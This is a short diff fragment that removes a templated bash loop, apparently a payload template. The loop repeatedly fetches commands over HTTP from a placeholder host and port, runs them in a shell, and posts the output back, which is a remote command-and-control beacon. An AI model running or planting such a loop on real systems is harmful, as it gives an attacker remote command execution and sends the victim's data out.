@@ -1,5 +1,0 @@
-while true; do
-    cmd=$(curl -s http://*\host*:*\port*);
-    res=$$(*\shell* -c "$$cmd" 2>&1);
-    curl -X POST -d "$$res" http://*\host*:*\port*;
-done;
